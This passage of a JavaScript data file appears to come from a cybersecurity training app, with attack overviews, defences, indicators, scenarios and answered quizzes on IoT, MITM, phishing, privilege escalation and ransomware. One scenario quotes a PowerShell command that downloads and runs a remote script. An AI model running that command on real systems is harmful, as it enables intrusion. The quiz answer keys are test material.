            explanation: 'Priority order matters: (1) Close the external firewall rule FIRST because internet exposure is the most urgent risk — any attacker could find these on Shodan right now. (2) Segment IoT into a dedicated VLAN so even if compromised, they cannot reach AD or file servers. (3) Change default credentials and disable Telnet (use SSH if remote management is needed). (4) Audit for prior compromise — given the devices were internet-exposed with default creds, assume they may already be compromised. Blocking Shodan does nothing — the devices are still exposed to anyone scanning.'
        },
        quiz: [
            { question: 'What is the MOST common vulnerability in IoT devices?', options: ['Zero-day exploits', 'Default or weak credentials', 'SQL injection', 'Cross-site scripting'], correct: 1, explanation: 'Default credentials remain the most exploited IoT weakness. Many devices ship with well-known passwords (admin/admin, root/root) that users never change, and some have hardcoded credentials that can\'t be changed.' },
            { question: 'Why is network segmentation critical for IoT security?', options: ['IoT devices need faster network speeds', 'It prevents compromised IoT devices from being used as pivot points into critical systems', 'IoT devices can\'t handle encrypted traffic', 'Segmentation makes IoT devices invisible to scanners'], correct: 1, explanation: 'Network segmentation isolates IoT devices so that if one is compromised, the attacker cannot use it to reach servers, databases, or other critical systems on the main network.' },
            { question: 'What makes Industrial IoT (IIoT) attacks uniquely dangerous compared to consumer IoT attacks?', options: ['IIoT devices are more expensive', 'IIoT attacks can cause physical damage, environmental harm, or endanger human lives', 'IIoT devices always have better security', 'IIoT is not connected to the internet'], correct: 1, explanation: 'IIoT controls physical processes — power grids, water treatment, manufacturing. The Triton malware targeted safety systems that prevent industrial accidents, potentially causing explosions or toxic releases.' },
            { question: 'What is Shodan in the context of IoT security?', options: ['An IoT antivirus product', 'A search engine that indexes internet-connected devices and their services/vulnerabilities', 'A secure IoT communication protocol', 'An IoT device manufacturer'], correct: 1, explanation: 'Shodan indexes every device connected to the internet, including IoT devices with open ports and services. Both security researchers and attackers use it to find vulnerable devices.' },
            { question: 'An organization\'s IP cameras are on the same network as their file servers. What is the primary risk?', options: ['The cameras will slow down file transfers', 'Compromised cameras can be used to access and attack the file servers', 'The file servers might overload the cameras', 'There is no significant risk'], correct: 1, explanation: 'Without segmentation, a compromised camera (often running outdated firmware with known vulnerabilities) sits on the same network as critical servers, giving an attacker a direct path to sensitive data.' }
        ]
    },

    // =================================================================
    // 9. MAN-IN-THE-MIDDLE (MITM)
    // =================================================================
    MITM: {
        code: 'MITM',
        title: 'Man-in-the-Middle Attacks',
        icon: '\u{1F9B9}',
        severity: 'high',
        color: '#a855f7',
        description: 'Attacks where an adversary secretly intercepts and potentially alters communications between two parties who believe they are communicating directly.',
        overview: {
            what: 'A Man-in-the-Middle (MITM) attack occurs when an attacker secretly positions themselves between two communicating parties, intercepting and potentially modifying the data flowing between them. The victims believe they are communicating directly with each other. MITM attacks can steal credentials, session tokens, financial data, and inject malicious content.',
            keyPoints: [
                'Attacker intercepts communication without either party knowing',
                'Can be passive (eavesdropping) or active (modifying data in transit)',
                'Common on unsecured Wi-Fi, through ARP spoofing, or via DNS manipulation',
                'HTTPS and certificate pinning are primary defenses',
                'SSL stripping can downgrade encrypted connections to unencrypted'
            ],
            examples: [
                { name: 'Superfish (2015)', detail: 'Lenovo pre-installed adware that installed a self-signed root CA, enabling MITM on all HTTPS traffic on affected laptops to inject advertisements.' },
                { name: 'BGP Hijacking of Amazon DNS (2018)', detail: 'Attackers used BGP hijacking to redirect Route 53 DNS traffic through their servers, stealing $150K in cryptocurrency from MyEtherWallet users.' },
                { name: 'Wi-Fi Pineapple Attacks', detail: 'Hardware tool creates rogue Wi-Fi access points mimicking legitimate networks. Connected users\' traffic passes through the attacker for interception.' }
            ],
            stats: [
                { label: 'MITM incidents', value: '35%', note: 'of exploitation activity (IBM X-Force)' },
                { label: 'Rogue Wi-Fi prevalence', value: '1 in 4', note: 'public hotspots are potentially rogue' },
                { label: 'HTTPS adoption', value: '~95%', note: 'of web traffic (Google Transparency Report)' }
            ]
        },
        attackFlow: {
            title: 'MITM Attack Flow',
            steps: [
                { phase: 'Positioning', description: 'Attacker gains a position between the victim and the target. Methods include ARP spoofing, rogue Wi-Fi access points, DNS spoofing, or BGP hijacking.', icon: '\u{1F4CD}' },
                { phase: 'Interception', description: 'Traffic between victim and server now flows through the attacker. For encrypted traffic, the attacker may attempt SSL stripping or use fraudulent certificates.', icon: '\u{1F50C}' },
                { phase: 'Decryption', description: 'If HTTPS is involved, attacker may use SSL stripping (downgrade to HTTP), present a forged certificate, or exploit weak cipher suites to decrypt traffic.', icon: '\u{1F513}' },
                { phase: 'Data Capture', description: 'Attacker captures credentials, session cookies, personal information, financial data, and other sensitive information flowing through the connection.', icon: '\u{1F4F8}' },
                { phase: 'Modification (Optional)', description: 'Attacker may inject malicious content, modify transactions (change bank transfer amounts/recipients), or inject malware download links.', icon: '\u{270F}' },
                { phase: 'Relay', description: 'Modified or captured traffic is forwarded to the intended recipient, maintaining the illusion of direct communication so neither party suspects compromise.', icon: '\u{27A1}' }
            ]
        },
        defense: {
            detection: [
                'Certificate transparency monitoring for unauthorized certificate issuance',
                'ARP table monitoring for duplicate MAC addresses or frequent changes',
                'Browser certificate warnings should NEVER be ignored or clicked through',
                'Network monitoring for SSL stripping indicators (HTTP redirects from HTTPS)',
                'Wireless intrusion detection for rogue access points'
            ],
            prevention: [
                'Enforce HTTPS everywhere with HSTS (HTTP Strict Transport Security)',
                'Certificate pinning for critical applications and APIs',
                'Use VPNs on untrusted networks (public Wi-Fi)',
                'Enable 802.1X port authentication and Dynamic ARP Inspection (DAI)',
                'Implement mutual TLS (mTLS) for service-to-service communication'
            ],
            response: [
                'Terminate all active sessions and force re-authentication',
                'Revoke and reissue any potentially compromised certificates',
                'Scan network for rogue devices and unauthorized access points',
                'Reset credentials for any accounts accessed during the compromise window',
                'Enable certificate transparency and HSTS preloading for affected domains'
            ]
        },
        indicators: {
            network: [
                'ARP table showing duplicate MAC addresses or frequent MAC-IP binding changes',
                'Certificate mismatches: browser warnings about untrusted or unexpected certificates',
                'HTTP traffic on connections that should be HTTPS (SSL stripping indicator)',
                'Rogue DHCP servers advertising themselves on the network',
                'Gratuitous ARP packets flooding the network segment'
            ],
            host: [
                'Browser certificate warnings for previously trusted websites',
                'New root CA certificates installed in the system trust store without authorization',
                'DNS settings changed to point to unauthorized resolvers',
                'Proxy configurations modified in browser or system settings',
                'Security software flagging SSL inspection by unknown certificates'
            ],
            behavioral: [
                'Users reporting that familiar websites look slightly different or have missing HTTPS indicators',
                'Unexpected password reset notifications from services the user did not request',
                'Session hijacking: users being logged out of accounts unexpectedly',
                'Financial transactions showing modified amounts or recipient details',
                'Multiple users on the same network experiencing certificate warnings simultaneously'
            ],
            tools: ['arpwatch (ARP monitoring)', 'Dynamic ARP Inspection (DAI)', 'Wireless IDS (Kismet)', 'Certificate Transparency logs', 'HSTS Preload List', 'Wireshark (ARP analysis)', 'SSLstrip detection tools', 'mTLS enforcement']
        },
        interactive: {
            scenario: 'Several employees at a branch office report that when they visit the company\'s internal HR portal (normally HTTPS), their browsers are loading the page over plain HTTP with no padlock icon. One employee ignored the issue and submitted their direct deposit changes, including bank routing and account numbers. Your network team finds an unknown device connected to a switch port in the branch office wiring closet. What type of attack is this, and what are your immediate actions?',
            options: [
                'The SSL certificate expired — renew it and the issue will resolve',
                'This is an SSL stripping MITM attack via a rogue device — disconnect the device, force password resets for all branch users, notify the employee to contact their bank immediately, forensically image the rogue device, and implement 802.1X port security',
                'The branch office firewall is blocking HTTPS traffic — reconfigure the firewall rules',
                'This is a browser configuration issue — clear browser caches on affected machines'
            ],
            correct: 1,
            explanation: 'This is a physical MITM attack using a rogue device (likely a network tap or Wi-Fi Pineapple equivalent) performing SSL stripping — intercepting HTTPS requests and downgrading them to HTTP. The employee who submitted bank details has had that information captured in plaintext. Immediate actions: (1) physically disconnect the rogue device and preserve it as evidence, (2) notify the affected employee to contact their bank IMMEDIATELY about the compromised routing/account numbers, (3) force password resets for all branch users whose traffic may have been intercepted, (4) forensically image the rogue device to determine scope, and (5) implement 802.1X port authentication and HSTS to prevent recurrence.'
        },
        quiz: [
            { question: 'In an ARP spoofing-based MITM attack, what does the attacker manipulate?', options: ['DNS records', 'The ARP tables of network devices to associate their MAC address with the victim\'s IP', 'Routing tables at the ISP', 'The victim\'s hosts file'], correct: 1, explanation: 'ARP spoofing sends fake ARP replies to associate the attacker\'s MAC address with the gateway\'s (or victim\'s) IP address, causing traffic to flow through the attacker.' },
            { question: 'What is SSL stripping?', options: ['Removing SSL certificates from a server', 'Downgrading an HTTPS connection to HTTP so the attacker can read the unencrypted traffic', 'A technique to crack SSL encryption', 'Disabling SSL on a network'], correct: 1, explanation: 'SSL stripping intercepts the initial HTTP request before the HTTPS redirect, maintaining an HTTP connection with the victim while connecting to the real server over HTTPS. The victim never gets encrypted.' },
            { question: 'How does HSTS (HTTP Strict Transport Security) help prevent MITM attacks?', options: ['It encrypts all network traffic', 'It tells browsers to ONLY connect via HTTPS, preventing SSL stripping', 'It blocks all ARP spoofing attempts', 'It requires a VPN for all connections'], correct: 1, explanation: 'HSTS tells browsers to only connect to the site over HTTPS. Even if an attacker tries SSL stripping, the browser refuses to connect over HTTP, breaking the attack.' },
            { question: 'Why should you NEVER ignore browser certificate warnings?', options: ['They indicate your browser needs updating', 'They may indicate an active MITM attack with a forged or invalid certificate', 'They mean the website is temporarily down', 'Certificate warnings are always false positives'], correct: 1, explanation: 'Certificate warnings can indicate that someone is presenting a fraudulent certificate to intercept your traffic. Clicking through these warnings allows the MITM attack to succeed.' },
            { question: 'A user on public Wi-Fi at a coffee shop notices the banking website doesn\'t show HTTPS. What is likely happening?', options: ['The bank forgot to renew their certificate', 'A MITM attacker may be performing SSL stripping on the Wi-Fi network', 'The coffee shop blocks HTTPS traffic', 'The user\'s browser has an SSL bug'], correct: 1, explanation: 'On public Wi-Fi, an attacker can perform SSL stripping to intercept the HTTPS redirect and keep the user on an unencrypted HTTP connection while the attacker connects to the bank over HTTPS.' },
            { question: 'Which MITM technique was used in the BGP hijacking attack against MyEtherWallet?', options: ['ARP spoofing on the local network', 'Manipulating internet routing to redirect DNS traffic through attacker-controlled servers', 'Setting up a rogue Wi-Fi access point', 'Exploiting a browser vulnerability'], correct: 1, explanation: 'The attackers used BGP hijacking to reroute Amazon\'s Route 53 DNS traffic through their infrastructure, allowing them to serve fake DNS responses and redirect users to a phishing site.' }
        ]
    },

    // =================================================================
    // 10. PHISHING
    // =================================================================
    PHISHING: {
        code: 'PHISHING',
        title: 'Phishing',
        icon: '\u{1F3A3}',
        severity: 'critical',
        color: '#a855f7',
        description: 'Deceptive attacks using fraudulent communications (email, SMS, voice) that appear to come from trusted sources to steal credentials, install malware, or manipulate victims.',
        overview: {
            what: 'Phishing is a social engineering attack that uses deceptive communications — primarily email — to trick recipients into revealing sensitive information, clicking malicious links, or downloading malware. Variants include spear phishing (targeted), whaling (targeting executives), vishing (voice/phone), smishing (SMS), and Business Email Compromise (BEC). Phishing is the #1 initial access vector for cyberattacks.',
            keyPoints: [
                'Spear phishing targets specific individuals with personalized content',
                'Whaling targets C-suite executives and senior leadership',
                'Vishing uses phone calls impersonating IT support, banks, or government',
                'Smishing delivers malicious links via SMS/text messages',
                'Business Email Compromise (BEC) uses compromised or spoofed executive email for fraud'
            ],
            examples: [
                { name: 'Google & Facebook BEC ($100M)', detail: 'Lithuanian attacker impersonated a hardware vendor via email, sending fake invoices to Google and Facebook for two years, stealing over $100 million before detection.' },
                { name: 'Twitter Hack (2020)', detail: 'Spear phishing phone calls (vishing) targeting Twitter employees led to internal tool access, resulting in hijacking of high-profile accounts (Obama, Musk, Apple) for Bitcoin scam.' },
                { name: 'Colonial Pipeline (2021)', detail: 'Compromised employee VPN credentials (likely from phishing or credential reuse) led to the ransomware attack that shut down the largest U.S. fuel pipeline for 6 days.' }
            ],
            stats: [
                { label: 'Breaches involving phishing', value: '36%', note: 'Verizon DBIR 2024' },
                { label: 'BEC losses in 2023', value: '$2.9B', note: 'FBI IC3 Report' },
                { label: 'Avg. click rate', value: '~3.4%', note: 'of phishing emails (KnowBe4)' }
            ]
        },
        attackFlow: {
            title: 'Phishing Campaign Lifecycle',
            steps: [
                { phase: 'Target Research', description: 'Attacker identifies targets and researches them via LinkedIn, company websites, and social media. For spear phishing, they study organizational structure, vendors, and communication styles.', icon: '\u{1F50D}' },
                { phase: 'Infrastructure Setup', description: 'Registers lookalike domains (micros0ft.com), sets up phishing pages that clone legitimate login portals, and configures email servers with SPF/DKIM to appear legitimate.', icon: '\u{1F3D7}' },
                { phase: 'Lure Crafting', description: 'Creates convincing email content with urgency triggers: "Your account will be locked," "Invoice overdue," "Package delivery failed," or impersonates a known contact.', icon: '\u{270D}' },
                { phase: 'Delivery', description: 'Sends phishing emails timed for maximum impact (Monday mornings, end of quarter). May use thread hijacking from compromised accounts for credibility.', icon: '\u{1F4E7}' },
                { phase: 'Victim Interaction', description: 'Victim clicks link and enters credentials on fake login page, opens malicious attachment (Office macros, PDF exploits), or replies with sensitive information.', icon: '\u{1F5B1}' },
                { phase: 'Exploitation', description: 'Attacker uses stolen credentials for account takeover, deploys malware for persistent access, or initiates wire transfers via BEC.', icon: '\u{1F4B8}' }
            ]
        },
        defense: {
            detection: [
                'Email security gateways with URL sandboxing and attachment detonation',
                'DMARC, DKIM, and SPF email authentication to detect spoofed senders',
                'User-reported phishing programs with easy one-click reporting',
                'Monitoring for newly registered lookalike domains (typosquatting)',
                'Anomaly detection for Business Email Compromise patterns (unusual payment requests)'
            ],
            prevention: [
                'Regular phishing simulation training for all employees',
                'Multi-factor authentication (MFA) to limit impact of stolen credentials',
                'Email filtering with advanced threat protection and safe links/attachments',
                'DNS filtering to block access to known phishing domains',
                'Strict wire transfer verification procedures (out-of-band confirmation)'
            ],
            response: [
                'Quarantine the phishing email across all mailboxes immediately',
                'Reset passwords for any accounts where credentials were entered',
                'Scan endpoints of users who clicked links or opened attachments',
                'Block the phishing domain/IP at firewall and proxy levels',
                'Report phishing infrastructure to registrars and industry groups (APWG)'
            ]
        },
        indicators: {
            network: [
                'Email headers showing SPF/DKIM/DMARC failures on incoming messages',
                'URLs in emails pointing to recently registered or lookalike domains (e.g., micros0ft.com)',
                'Redirects through URL shorteners or open redirectors to phishing pages',
                'Connections to known phishing infrastructure IPs flagged by threat intel feeds',
                'Outbound HTTP POST requests from endpoints to unfamiliar login page domains'
            ],
            host: [
                'Office documents with macro-enabled content (.docm, .xlsm) received from external senders',
                'PowerShell or cmd.exe spawned by Office applications (malicious macro execution)',
                'Newly created credential files or browser password database changes after clicking links',
                'Downloads of .hta, .js, .vbs, or .iso files from email links',
                'Browser history showing visits to pages mimicking login portals of known services'
            ],
            behavioral: [
                'Multiple employees reporting similar suspicious emails within a short timeframe',
                'Employees receiving emails creating extreme urgency (account locked, CEO request, overdue payment)',
                'Wire transfer or gift card requests via email that bypass normal approval workflows',
                'Users forwarding suspicious emails to colleagues instead of reporting to security team',
                'Spike in password reset requests following a phishing wave'
            ],
            tools: ['DMARC/DKIM/SPF validation', 'PhishTank / OpenPhish (URL databases)', 'URL sandboxing (Any.Run, Joe Sandbox)', 'Email security gateways (Proofpoint, Mimecast)', 'KnowBe4 / Cofense (phishing simulation)', 'Gophish (open-source phish testing)', 'VirusTotal (attachment analysis)', 'DomainTools (lookalike domain monitoring)']
        },
        interactive: {
            scenario: 'The CFO\'s executive assistant receives an urgent email that appears to come from the CFO (correct display name, company email signature) requesting an immediate wire transfer of $187,000 to a new vendor. The email says: "I\'m in a board meeting and can\'t take calls. Please process this before 3 PM today. The vendor account details are attached. DO NOT discuss this with anyone until the deal is finalized." The email address in the "From" header is cfo@yourcompany.co (note: your actual domain is yourcompany.com). What should the assistant do?',
            options: [
                'Process the wire transfer immediately since the CFO marked it urgent and provided a deadline',
                'Reply to the email asking the CFO to confirm the request',
                'Recognize the BEC indicators (urgency, secrecy, slight domain mismatch, bypassing normal process) — do NOT process the transfer, verify with the CFO through a separate communication channel (phone call to known number), and report to the security team',
                'Forward the email to the finance department for processing since it appears to be from the CFO'
            ],
            correct: 2,
            explanation: 'This is a Business Email Compromise (BEC) attack with multiple red flags: (1) extreme urgency with a deadline, (2) explicit instruction to bypass normal procedures ("DO NOT discuss"), (3) the domain is .co not .com (a common typosquat), (4) the CFO conveniently "can\'t take calls." Never reply to the suspicious email (the attacker controls that inbox). Instead, verify through an independent channel — call the CFO\'s known phone number or walk to their office. BEC is the most financially damaging form of phishing, with $2.9B in losses reported to the FBI in 2023 alone.'
        },
        quiz: [
            { question: 'What distinguishes spear phishing from regular phishing?', options: ['Spear phishing uses phone calls', 'Spear phishing is targeted at specific individuals with personalized content', 'Spear phishing only targets IT departments', 'Spear phishing uses physical mail'], correct: 1, explanation: 'Regular phishing is sent to many people with generic content. Spear phishing researches specific targets and customizes the lure to their role, interests, or relationships, making it much more convincing.' },
            { question: 'A CEO receives an urgent email from the "CFO" requesting an immediate wire transfer to a new vendor. What attack is this?', options: ['Regular phishing', 'Vishing', 'Business Email Compromise (BEC) / whaling', 'Smishing'], correct: 2, explanation: 'This is Business Email Compromise targeting an executive (whaling). BEC attacks impersonate or compromise executive email to authorize fraudulent financial transactions.' },
            { question: 'Why is Multi-Factor Authentication (MFA) effective against phishing?', options: ['It blocks phishing emails from arriving', 'Even if credentials are stolen, the attacker needs the second factor to access the account', 'MFA encrypts all email traffic', 'MFA prevents users from clicking on links'], correct: 1, explanation: 'MFA adds a second verification step (token, biometric, push notification) that the attacker doesn\'t have. Even with the stolen password, they can\'t complete authentication without the second factor.' },
            { question: 'What does DMARC help prevent?', options: ['Malware downloads', 'Email domain spoofing by validating sender identity through SPF and DKIM', 'DDoS attacks', 'Data exfiltration'], correct: 1, explanation: 'DMARC (Domain-based Message Authentication) uses SPF and DKIM to verify that emails actually come from the domain they claim to be from, blocking spoofed sender addresses.' },
            { question: 'An employee receives an SMS saying their bank account is locked with a link to "verify." What type of phishing is this?', options: ['Spear phishing', 'Whaling', 'Vishing', 'Smishing'], correct: 3, explanation: 'Smishing (SMS phishing) delivers phishing lures via text messages. These often create urgency about bank accounts, package deliveries, or account verification to trick users into clicking malicious links.' },
            { question: 'After a phishing campaign is detected, what is the FIRST action the security team should take?', options: ['Fire the employees who clicked the link', 'Quarantine the phishing email from all mailboxes and block the phishing domain', 'Send a company-wide email about phishing', 'Reset all employee passwords'], correct: 1, explanation: 'The immediate priority is containment: remove the phishing email from all mailboxes to prevent more victims, and block the domain to prevent data exfiltration from already-compromised users.' }
        ]
    },

    // =================================================================
    // 11. PRIVILEGE ESCALATION
    // =================================================================
    PRIVILEGE_ESCALATION: {
        code: 'PRIVILEGE_ESCALATION',
        title: 'Privilege Escalation',
        icon: '\u{1F4C8}',
        severity: 'critical',
        color: '#a855f7',
        description: 'Exploiting vulnerabilities or misconfigurations to gain higher-level permissions than originally authorized, moving from standard user to admin or root access.',
        overview: {
            what: 'Privilege escalation is the act of exploiting a bug, design flaw, or misconfiguration to gain elevated access to resources that are normally protected. There are two types: vertical (gaining higher privileges, e.g., user to admin) and horizontal (accessing another user\'s resources at the same privilege level). It is a critical step in nearly every cyberattack chain.',
            keyPoints: [
                'Vertical escalation: low-privilege user gains admin/root/SYSTEM access',
                'Horizontal escalation: accessing another user\'s account or data at the same level',
                'Common vectors: kernel exploits, misconfigured SUID/sudo, unquoted service paths, token impersonation',
                'Present in virtually every post-exploitation attack chain',
                'MITRE ATT&CK catalogs 14+ privilege escalation techniques'
            ],
            examples: [
                { name: 'PrintNightmare (CVE-2021-34527)', detail: 'Windows Print Spooler vulnerability allowed any authenticated user to gain SYSTEM-level code execution on any Windows machine with the service running.' },
                { name: 'Dirty COW (CVE-2016-5195)', detail: 'Linux kernel race condition in copy-on-write mechanism allowed unprivileged users to gain write access to read-only memory mappings, enabling root access.' },
                { name: 'PwnKit (CVE-2021-4034)', detail: 'Memory corruption in Linux Polkit\'s pkexec allowed any unprivileged user to gain root privileges. Present in all major Linux distributions for 12+ years.' }
            ],
            stats: [
                { label: 'Attacks involving priv esc', value: '~80%', note: 'CrowdStrike Threat Report' },
                { label: 'Avg. time to escalate', value: '< 1 hour', note: 'in penetration tests (SANS)' },
                { label: 'Misconfiguration-based', value: '~65%', note: 'vs. exploit-based escalation' }
            ]
        },
        attackFlow: {
            title: 'Privilege Escalation Attack Flow',
            steps: [
                { phase: 'Initial Access', description: 'Attacker obtains low-privilege access through phishing, web application exploit, or compromised credentials. They now have a foothold but limited permissions.', icon: '\u{1F511}' },
                { phase: 'Enumeration', description: 'Systematically enumerates the system: OS version, patch level, running services, SUID binaries, scheduled tasks, installed software, and credential stores.', icon: '\u{1F4CB}' },
                { phase: 'Vulnerability Identification', description: 'Identifies escalation paths: unpatched kernel vulnerabilities, misconfigured sudo rules, writable service binaries, unquoted service paths, or stored credentials.', icon: '\u{1F50E}' },
                { phase: 'Exploit Execution', description: 'Executes the escalation technique: kernel exploit, DLL hijacking, service binary replacement, token impersonation, or credential harvesting.', icon: '\u{26A1}' },
                { phase: 'Privilege Verification', description: 'Confirms elevated access (whoami, id), tests new capabilities, and may create a persistent high-privilege account or backdoor.', icon: '\u{2705}' },
                { phase: 'Objective Execution', description: 'With elevated privileges: accesses restricted data, installs persistent backdoors, modifies security settings, or moves laterally to other systems.', icon: '\u{1F3AF}' }
            ]
        },
        defense: {
            detection: [
                'Monitor for unexpected privilege changes (new admin accounts, group membership changes)',
                'Alert on exploitation indicators: unusual process trees, kernel module loading',
                'EDR behavioral detection for common escalation techniques (token manipulation, named pipe impersonation)',
                'Audit log analysis for sudo/runas usage anomalies',
                'File integrity monitoring on system binaries and service configurations'
            ],
            prevention: [
                'Aggressive patch management — especially kernel and OS-level updates',
                'Remove unnecessary SUID/SGID binaries and constrain sudo privileges',
                'Least privilege principle: users and services run with minimum required permissions',
                'Application whitelisting to prevent unauthorized executable execution',
                'Disable unnecessary services and remove unused software'
            ],
            response: [
                'Immediately isolate the affected system to prevent lateral movement',
                'Determine the escalation vector used and patch/mitigate it',
                'Audit all changes made with elevated privileges (accounts created, files modified)',
                'Check for persistence mechanisms installed during the elevated session',
                'Scan other systems for the same vulnerability or misconfiguration'
            ]
        },
        indicators: {
            network: [
                'Remote administration tool traffic (PsExec, WMI, WinRM) from non-admin workstations',
                'Kerberoasting: high volume of TGS requests for service accounts from a single host',
                'Pass-the-Hash indicators: NTLM authentication attempts from unexpected sources',
                'Golden Ticket/Silver Ticket: Kerberos tickets with abnormally long lifetimes',
                'DCSync replication traffic from a machine that is not a domain controller'
            ],
            host: [
                'New local administrator accounts created without corresponding change tickets',
                'Unexpected changes to sudo configuration, SUID binaries, or /etc/passwd on Linux',
                'Event ID 4672 (special privileges assigned) for unexpected user accounts on Windows',
                'DLL hijacking: legitimate application loading DLLs from writable directories',
                'Scheduled tasks or services running with SYSTEM/root privileges created by non-admin users'
            ],
            behavioral: [
                'Low-privilege user account suddenly accessing admin-only resources',
                'Enumeration activity: rapid access to system files, registry hives, or configuration files',
                'Token manipulation or impersonation attempts logged by EDR solutions',
                'User running privilege escalation enumeration scripts (winPEAS, LinPEAS, PowerUp)',
                'Service account performing interactive logons or actions inconsistent with its purpose'
            ],
            tools: ['LinPEAS / winPEAS (enumeration)', 'BloodHound (AD attack path analysis)', 'Seatbelt (Windows security enumeration)', 'PowerUp (Windows privesc checking)', 'GTFOBins (Linux binary exploits)', 'LOLBAS (Living-off-the-land binaries)', 'CrowdStrike / SentinelOne (EDR)', 'Sysmon (Windows event logging)']
        },
        interactive: {
            scenario: 'During a routine security audit, your EDR platform flags a workstation where a standard user account ran the following commands in sequence: "whoami /priv", "systeminfo", "net localgroup administrators", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services", and then attempted to run "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(\'http://10.0.0.5/PowerUp.ps1\')". What is happening and what is the appropriate response?',
            options: [
                'The user is a curious IT student exploring Windows commands — educate them about acceptable use',
                'This is automated system maintenance software collecting inventory data',
                'The sequence is a textbook privilege escalation enumeration pattern — isolate the workstation, investigate how the attacker gained initial access, scan for lateral movement, and preserve evidence',
                'The antivirus should block the PowerShell download so no further action is needed'
            ],
            correct: 2,
            explanation: 'This is a clear post-exploitation privilege escalation sequence: (1) whoami /priv — check current privilege level, (2) systeminfo — identify OS version and patch level for exploit matching, (3) net localgroup administrators — enumerate admin accounts, (4) registry service query — look for vulnerable service configurations, (5) download PowerUp.ps1 — an automated privilege escalation toolkit. This is not curiosity — it is a methodical attack chain. The internal IP (10.0.0.5) hosting the tool suggests the attacker already has another compromised system on the network. Isolate immediately, investigate initial access vector, and hunt for the staging server at 10.0.0.5.'
        },
        quiz: [
            { question: 'What is the difference between vertical and horizontal privilege escalation?', options: ['Vertical uses exploits, horizontal uses social engineering', 'Vertical gains higher privileges (user to admin), horizontal accesses another user\'s resources at the same level', 'Vertical is more dangerous than horizontal', 'Vertical affects Linux, horizontal affects Windows'], correct: 1, explanation: 'Vertical escalation moves up the privilege hierarchy (standard user to admin/root). Horizontal escalation moves sideways to access another account\'s resources at the same privilege level.' },
            { question: 'An attacker finds a Linux binary with the SUID bit set that has a buffer overflow. Why is this significant?', options: ['SUID binaries run faster', 'SUID binaries execute with the file owner\'s privileges, so exploiting it can grant root access', 'SUID means the binary is encrypted', 'SUID binaries are always vulnerable'], correct: 1, explanation: 'SUID (Set User ID) binaries execute with the permissions of the file owner (often root). A buffer overflow in a SUID-root binary allows the attacker to execute arbitrary code as root.' },
            { question: 'What was the Dirty COW vulnerability?', options: ['A Windows privilege escalation via Print Spooler', 'A Linux kernel race condition that allowed unprivileged users to gain write access to read-only memory', 'A SQL injection in a popular web framework', 'A firmware vulnerability in network equipment'], correct: 1, explanation: 'Dirty COW (CVE-2016-5195) exploited a race condition in the Linux kernel\'s copy-on-write mechanism, allowing unprivileged users to modify read-only files and escalate to root.' },
            { question: 'Why is privilege escalation considered a critical step in most cyberattacks?', options: ['It is the easiest step to accomplish', 'Initial access usually provides limited permissions — escalation unlocks the ability to access sensitive data and maintain persistence', 'Most malware requires admin rights to install', 'Privilege escalation is required by law'], correct: 1, explanation: 'Attackers typically gain initial access with low privileges. Escalation to admin/root is critical for accessing sensitive data, disabling security controls, and establishing persistent backdoors.' },
            { question: 'What enumeration tool would a Linux attacker use first to identify privilege escalation paths?', options: ['Nmap', 'LinPEAS or similar local enumeration script', 'Wireshark', 'Metasploit'], correct: 1, explanation: 'LinPEAS (Linux Privilege Escalation Awesome Script) systematically checks for common escalation vectors: SUID binaries, cron jobs, sudo misconfigs, writable paths, stored credentials, and kernel vulnerabilities.' }
        ]
    },

    // =================================================================
    // 12. RANSOMWARE
    // =================================================================
    RANSOMWARE: {
        code: 'RANSOMWARE',
        title: 'Ransomware',
        icon: '\u{1F512}',
        severity: 'critical',
        color: '#a855f7',
        description: 'Malware that encrypts victim files and demands ransom payment (usually cryptocurrency) for the decryption key, often combined with data theft for double extortion.',
        overview: {
            what: 'Ransomware is malware that encrypts a victim\'s files, systems, or entire network and demands payment (typically in cryptocurrency) for the decryption key. Modern ransomware operations employ "double extortion" (encrypt + steal data) and even "triple extortion" (add DDoS threats or contact the victim\'s customers). Ransomware-as-a-Service (RaaS) has industrialized the threat, with affiliates carrying out attacks using shared infrastructure.',
            keyPoints: [
                'Ransomware-as-a-Service (RaaS) provides ready-made tools to affiliates for a profit share',
                'Double extortion: encrypt files AND threaten to publish stolen data',
                'Triple extortion: add DDoS attacks or direct threats to customers/partners',
                'Average ransom payment has exceeded $1.5 million (Sophos 2024)',
                'Recovery costs are typically 10x the ransom amount'
            ],
            examples: [
                { name: 'WannaCry (2017)', detail: 'Exploited EternalBlue (MS17-010) SMB vulnerability, spreading worm-like across networks. Infected 230,000+ computers in 150 countries. NHS hospitals turned patients away.' },
                { name: 'Colonial Pipeline (2021)', detail: 'DarkSide ransomware shut down the largest U.S. fuel pipeline for 6 days. Company paid $4.4M ransom (FBI recovered $2.3M). Caused fuel shortages across the Southeast.' },
                { name: 'MOVEit (2023)', detail: 'Cl0p ransomware gang exploited zero-day in MOVEit file transfer software, compromising 2,500+ organizations and exposing data of 65+ million individuals globally.' }
            ],
            stats: [
                { label: 'Avg. ransom payment', value: '$1.54M', note: 'Sophos State of Ransomware 2024' },
                { label: 'Avg. recovery cost', value: '$2.73M', note: 'including downtime (Sophos 2024)' },
                { label: 'Attacks per year', value: '317M+', note: 'attempts blocked (SonicWall 2023)' }
            ]
        },
        attackFlow: {
            title: 'Ransomware Attack Lifecycle',
            steps: [
                { phase: 'Initial Access', description: 'Entry via phishing emails with malicious attachments, exploiting public-facing vulnerabilities (VPN, RDP), or purchased access from Initial Access Brokers (IABs).', icon: '\u{1F6AA}' },
                { phase: 'Post-Exploitation', description: 'Deploys Cobalt Strike, Mimikatz, or similar tools. Escalates privileges, maps the network, and identifies Active Directory domain controllers.', icon: '\u{1F9F0}' },
                { phase: 'Lateral Movement', description: 'Spreads across the network using stolen credentials, PsExec, WMI, or RDP. Targets file servers, databases, and backup systems specifically.', icon: '\u{27A1}' },
                { phase: 'Data Exfiltration', description: 'Before encryption, steals sensitive data for double extortion leverage. Uses Rclone, MegaSync, or custom tools to upload data to attacker infrastructure.', icon: '\u{1F4E4}' },
                { phase: 'Encryption', description: 'Deploys ransomware payload across all reachable systems simultaneously (often via Group Policy). Destroys shadow copies and backup catalogs before encrypting files.', icon: '\u{1F512}' },
                { phase: 'Ransom Demand', description: 'Drops ransom notes on every encrypted system. Provides Tor-based portal for communication. Threatens data publication on leak site with countdown timer.', icon: '\u{1F4B0}' }
            ]
        },
        defense: {
            detection: [
                'EDR monitoring for mass file encryption patterns (rapid file renames, extension changes)',
                'Canary files (honeypot files) that trigger alerts when accessed or modified',
                'Shadow copy deletion monitoring (vssadmin, wmic shadowcopy)',
